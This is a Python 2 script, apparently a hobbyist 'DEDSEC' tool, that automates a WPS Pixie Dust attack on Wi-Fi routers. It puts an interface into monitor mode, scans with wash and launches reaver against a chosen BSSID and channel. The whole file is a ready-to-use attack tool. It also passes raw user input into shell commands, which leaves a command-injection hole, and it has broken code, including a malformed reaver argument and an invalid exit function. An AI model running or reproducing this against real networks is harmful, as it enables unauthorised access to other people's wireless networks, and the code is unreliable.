#!/bin/python2
# -*- coding: utf-8 -*-
##CODED BY OXBIT
##DON'T COPY THIS CODE, DON'T BE A SCRIPTKIDDIE

import os
import time
	
def banner():
	print("")
	print("██████████   ██████████ ██████████    █████████  ██████████   █████████ ")
	time.sleep(0.1)
	print("░░███░░░░███ ░░███░░░░░█░░███░░░░███  ███CODED BY:OXBIT░░░█  ███░░░░░███")
	time.sleep(0.1)
	print("░███   ░WIFI EXPLOIT    ░███   ░░███░███    ░░░  ░███  █ ░  ███     ░░░ ")
	time.sleep(0.1)
	print("░███    ░███ ░██████    ░███    ░███░░█████████  ░██████   ░███         ")
	time.sleep(0.1)
	print("░███    ░███ ░███░░█    ░███    ░███ ░░░░░░░░███ ░███░░█   ░███         ")
	time.sleep(0.1)
	print("░███    ███  ░███ ░   █ ░███  DEDSEC HACKER ░███ ░███ ░ V.1░░███     ███")
	time.sleep(0.1)
	print("██████████   ██████████ ██████████  ░░█████████  ██████████ ░░█████████ ")
	time.sleep(0.1)
	print("░░░░░░░░░░   ░░░░░░░░░░ ░░░░░░░░░░    ░░░░░░░░░  ░░░░░░░░░░   ░░░░░░░░░ ")
	time.sleep(0.1)
	print("")
	print("[*] DEDSEC PIXIE DUST ATTACK     - / -    HTTPS://GITHUB.COM/OXBITX   [*]")

def banner2():
	print("[*]/////////////////////////////////////////////////////////[*]")
	print("[*] 1. ATTACK")
	print("[*] 2. MONITOR MODE")
	print("[*] 3. MANAGED MODE")
	print("[*] 4. EXIT")
	print("")
	print("[*]/////////////////////////////////////////////////////////[*]")

banner()

def check_interface():
	print("")
	os.system("iw dev")
	print("")
	
def monitor_mode():
	os.system("clear")
	check_interface()
	i = raw_input("Interface: ")
	os.system("sudo ifconfig " +i+ " down")
	os.system("sudo iwconfig " +i+ " mode monitor")
	os.system("sudo ifconfig " +i+ " up")

def managed_mode():
	os.system("clear")
	check_interface()
	i = raw_input("Interface: ")
	os.system("sudo ifconfig " +i+ " down")
	os.system("sudo iwconfig " +i+ " mode managed")
	os.system("sudo ifconfig " +i+ " up")
	os.system("sudo service networking restart")
	banner()
	
def attack():
	os.system("clear")
	check_interface()
	i = raw_input("Interface: ")
	os.system("clear")
	print("[*] CTRL + C TO STOP SCANNING. [*]")
	print("")
	os.system("sudo wash -i " +i)
	print("[*]-------------------------------------------------------------------[*]")
	b = raw_input("[*]target bssid: ")
	c = raw_input("[*]target channel: ")
	os.system("sudo reaver -i "+i+" -b " +b+ " -c " +c+ "-gt 14 -K 1 -N -vvv")
	time.sleep(3)
	
def exit():
	os.close()

while True:
	print("")
	banner2()
	code = int(input("[*] █ COMMAND █:"))
	if code == (1):
		attack()
	elif code == (2):
		monitor_mode()
	elif code == (3):
		managed_mode()
	elif code == (4):
		exit()
	else:
		print("[*]//////////[*]")
		print("INVALID COMMAND  = ERROR")
		print("[*]//////////[*]")
		print("")
		time.sleep(2)
		banner()

